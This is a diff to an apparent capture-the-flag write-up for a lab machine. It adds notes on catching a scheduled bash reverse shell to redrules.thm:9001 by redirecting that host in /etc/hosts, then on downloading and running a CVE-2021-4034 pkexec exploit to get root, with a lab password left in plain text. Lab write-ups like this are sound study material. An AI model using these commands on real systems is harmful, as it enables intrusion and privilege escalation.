@@ -95,7 +95,42 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-30 06:22:
 ## Credentials login: blue   password: sup3r_p@s$w0rd!9
 get first flag
 
-Fine here is the root password WW91IGFyZSBhIGxvc2VyIEJsdWU=
+### run linpeas nothing
+### run PsPy32
+2024/05/31 08:55:01 CMD: UID=0     PID=42226  | grep -v root 
+2024/05/31 08:55:01 CMD: UID=1001  PID=42228  | sh 
+2024/05/31 08:55:01 CMD: UID=1001  PID=42229  | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
 
+on background is creating reverse shell to redrules.thm/9001
+
+## Modify /etc/hosts to own IP and run listener on port 9001
+echo "10.9.30.202 redrules.thm" >> /etc/hosts
+get red console and second flag 
+
+### run linpeas and found SUID 
+
+red@red:~/.git$ find / -type f -perm -4000 2>/dev/null
+/home/red/.git/pkexec
+
+## cant compile exploit CVE-2021-4034 no gcc/cc/depencies but exist Python3  exploit
+
+red@red:/tmp$ wget http://10.9.30.202/CVE-2021-4034.py                          
+--2024-05-31 09:14:46--  http://10.9.30.202/CVE-2021-4034.py
+Connecting to 10.9.30.202:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3377 (3.3K) [text/x-python]
+Saving to: ‘CVE-2021-4034.py’
+
+CVE-2021-4034.py    100%[===================>]   3.30K  --.-KB/s    in 0s      
+
+2024-05-31 09:14:46 (242 MB/s) - ‘CVE-2021-4034.py’ saved [3377/3377]
+
+red@red:/tmp$ python3 CVE-2021-4034.py
+python3 CVE-2021-4034.py
+[+] Creating shared library for exploit code.
+[+] Calling execve()
+# id
+id
+uid=0(root) gid=1001(red) groups=1001(red)
 
 </code>
